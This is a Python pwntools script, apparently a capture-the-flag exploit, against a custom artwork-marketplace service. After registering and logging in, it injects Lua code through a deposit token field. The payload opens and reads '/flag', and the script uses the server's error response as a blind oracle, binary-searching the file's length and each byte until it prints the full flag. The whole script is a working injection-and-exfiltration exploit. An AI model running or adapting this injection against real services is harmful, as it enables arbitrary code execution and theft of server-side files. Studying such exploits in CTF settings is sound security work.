#!/usr/bin/env python3
import os
import sys
import base64
from pwn import *

LOGIN         = 0x00
REGISTER      = 0x01
LIST_ARTWORKS = 0x02
ADD_ARTWORK   = 0x08
DEPOSIT       = 0x0A
QUIT          = 0x0E

def b64_xor_demo_token() -> str:
    msg = b"DEMO_TOKEN"
    key = b'\x01\x02\x03'
    enc = bytes([msg[i] ^ key[i % len(key)] for i in range(len(msg))])
    return base64.b64encode(enc).decode()

class Client:
    def __init__(self, host, port):
        self.r = remote(host, port)
        self.username = None
        self.password = None
        self.session_code = None

    def send_command(self, command, arguments: list = []):
        if command not in (LOGIN, REGISTER):
            assert self.session_code is not None, "You must login first!"
            arguments = [self.username, '', self.session_code] + arguments

        command_line = f'{command}|' + '|'.join(arguments)
        commandlength = len(command_line)
        commandlength = commandlength.to_bytes(4, byteorder='big')
        self.r.send(commandlength)
        self.r.send(command_line.encode())
        res_len = int.from_bytes(self.r.recv(4))
        res = self.r.recv(res_len)
        parsed_res = res.decode().split('|')
        assert len(res) == res_len, f"Expected {res_len} bytes, got {len(res)} bytes"
        return parsed_res

    def register(self, user=None, pw=None):
        self.username = user or os.urandom(4).hex()
        self.password = pw or os.urandom(4).hex()
        fields = self.send_command(REGISTER, [self.username, self.password])
        return fields

    def login(self, user=None, pw=None):
        self.username = user or self.username
        self.password = pw or self.password
        fields = self.send_command(LOGIN, [self.username, self.password])
        token = ""
        for i,f in enumerate(fields):
            if "Login successful" in f and i>0 and fields[i-1]:
                token = fields[i-1]; break
        self.session_code = token
        return fields

    def add_artwork(self, title, artist, type, price, current_price):
        res = self.send_command(ADD_ARTWORK, [f"{title}~{artist}~{type}~{price}", f"{current_price}"])
        return res
    
    def list_artworks(self):
        res = self.send_command(LIST_ARTWORKS, [])
        return res
    
    def probe(self, cond: str) -> bool:
        lua = (
            "') and (function() "
            "local f=io.open('/flag','r'); local s=''; if f then s=f:read('*a'); f:close() end; "
            f"assert({cond}); return 'true' end)() or ('"
        )
        tok = b64_xor_demo_token() + lua
        fields = self.send_command(DEPOSIT, [tok])
        return "Invalid $NAUT token" not in "|".join(fields)

    # ---- binary search length using monotone predicate (#s >= n)
    def leak_len(self) -> int:
        lo, hi = 0, 1
        while self.probe(f"#s>={hi}"):
            lo, hi = hi, hi * 2
        # now #s in (lo..hi-1)
        L, R = lo, hi - 1
        while L < R:
            mid = (L + R + 1) // 2
            if self.probe(f"#s>={mid}"):
                L = mid
            else:
                R = mid - 1
        return L

    # ---- binary search a single byte: find exact s:byte(i)
    def leak_byte(self, i: int) -> int:
        # we know i <= len, so byte(i) is non-nil
        L, R = 32, 128 # ascii printable range
        while L < R:
            mid = (L + R) // 2
            # monotone in mid: (b <= mid)
            cond = f"(s:byte({i}) or 0) > 0 and (s:byte({i}) or 0) <= {mid}"
            if self.probe(cond):
                R = mid
            else:
                L = mid + 1
        return L
    
if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8081

    username = os.urandom(6).hex()
    password = os.urandom(6).hex()
    c = Client(host, port)
    c.register(username, password)
    c.login(username, password)
    
    n = c.leak_len()
    print("leaked flag length:", n)

    known = "flag{"
    out = list(known.encode())
    print(f"known prefix: {known!r} ({len(known)} bytes)")
    for i in range(len(known)+1, n):
        print(f"leaking byte {i} of {n}...")
        b = c.leak_byte(i)
        out.append(b)
        s = bytes(out).decode(errors="replace")
        print(f"[{i}/{n}] -> {b:3d} '{chr(b)}' | {s!r}")

    flag = bytes(out).decode(errors="replace")
    print("\n[FLAG]", flag)